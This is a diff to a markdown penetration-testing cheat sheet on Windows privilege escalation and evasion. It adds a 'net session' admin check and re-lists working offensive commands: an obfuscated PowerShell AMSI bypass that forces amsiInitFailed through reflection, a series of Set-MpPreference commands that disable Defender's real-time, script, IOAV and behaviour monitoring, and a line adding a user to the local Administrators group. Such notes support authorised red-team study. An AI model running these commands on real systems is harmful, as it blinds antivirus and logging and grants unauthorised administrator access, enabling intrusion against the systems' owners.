@@ -47,6 +47,19 @@ Get-ModifiableServiceFile -Verbose
 net localgroup Administrators john /add
 ```
 
+**Check if you are local admin**
+
+```powershell
+net session
+
+If you are NOT an admin, you get an access is denied message.
+System error 5 has occurred.
+Access is denied.
+
+If you ARE an admin, you get a different message, the most common being:
+There are no entries in the list
+```
+
 **Get the services whose configuration current user can modify (e.g ACLs of the Service, maybe point service to different executable**
 
 ```powershell
@@ -84,14 +97,14 @@ Get-ModifiableService -Verbose
 ## **Bypass AV / Defender / Applocker / Enhanced Script Block Logging**
 
 **AMSI Bypass**\
-****S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( TYpE ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
+S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( TYpE ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
 
 amsi.fail
 
 **Disable AV Protection/Monitoring**
 
-<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">Set-MpPreference -DisableRealtimeMonitoring 1 -ErrorAction SilentlyContinue
-<strong>Set-MpPreference -DisableScriptScanning 1 -ErrorAction SilentlyContinue
+<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>Set-MpPreference -DisableRealtimeMonitoring 1 -ErrorAction SilentlyContinue
+</strong><strong>Set-MpPreference -DisableScriptScanning 1 -ErrorAction SilentlyContinue
 </strong>Set-MpPreference -DisableIOAVProtection 1 -ErrorAction SilentlyContinue 
 Set-MpPreference -DisableBehaviorMonitoring 1 -ErrorAction SilentlyContinue 
 Set-MpPreference -DisableIntrusionPreventionSystem 1 -ErrorAction SilentlyContinue 
@@ -147,7 +160,7 @@ or paste the content of sbloggingbypass.txt
 
 ```
 
-****
+
 
 **Identify Code/Strings Defender may flag**\
 https://github.com/matterpreter/DefenderCheck => C# without builds\
